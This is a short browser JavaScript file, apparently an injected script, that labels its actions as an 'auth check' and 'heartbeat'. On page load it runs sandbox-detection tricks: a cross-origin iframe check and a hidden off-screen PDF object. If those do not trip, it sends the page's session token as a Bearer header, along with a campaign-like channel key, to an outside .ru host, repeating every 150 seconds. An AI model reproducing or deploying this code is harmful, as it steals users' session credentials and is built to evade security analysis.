(function(){
  'use strict';

  const var_6b96c39fc9      = "7f2f4b4ee5da1a5aaca95d6ae4618589de16dc58439340bda789cff5ea9f814a";
  const var_08146f0199 = "premium51";
  const var_eba3fff05b    = "US";
  const var_417da92e05  = "1765830800";
  const var_a0a1a4d88f     = "1765848800";

  let isSandboxed = false;

  function detectSandbox() {
    try {
      if (window.top !== window.self) {
        try {
          void window.top.location.href;
        } catch (e) {
          isSandboxed = true;
          console.log('S1');
          return;
        }
      }
      const obj = document.createElement('object');
      obj.data = 'data:application/pdf;base64,aG1t';
      obj.width = 1;
      obj.height = 1;
      obj.style.position = 'absolute';
      obj.style.top = '-500px';
      obj.style.left = '-500px';
      obj.style.visibility = 'hidden';
      obj.onerror = function() {
        isSandboxed = true;
        console.log('S2');
        this.remove();
      };
      document.body.appendChild(obj);
    } catch (err) {
      isSandboxed = true;
      console.log('S3');
    }
  }

  function fetchWithRetry(url, retries, delay, init) {
    return new Promise((resolve, reject) => {
      const attempt = () => {
        fetch(url, init)
          .then(r => { if (!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
          .then(resolve)
          .catch(err => (retries--) ? setTimeout(attempt, delay) : reject(err));
      };
      attempt();
    });
  }

  function runAuthCheck() {
    if (isSandboxed) {
      console.log('X1: sandboxed');
      return;
    }

    const headers = new Headers();
    headers.append('Authorization', 'Bearer ' + window.SESSION_TOKEN);
    headers.append('X-Channel-Key', var_08146f0199);

    fetchWithRetry('https://chevy.kiko2.ru/heartbeat', 2, 500, { 
        method: 'GET', 
        headers: headers,
        keepalive: true 
    })
      .then(data => {
        console.log('Heartbeat OK');
      })
      .catch(e => {
        console.log('E1: Heartbeat failed', e);
      });
  }

  window.addEventListener('load', () => {
    detectSandbox();

    runAuthCheck();

    setInterval(runAuthCheck, 150000);
  });

})();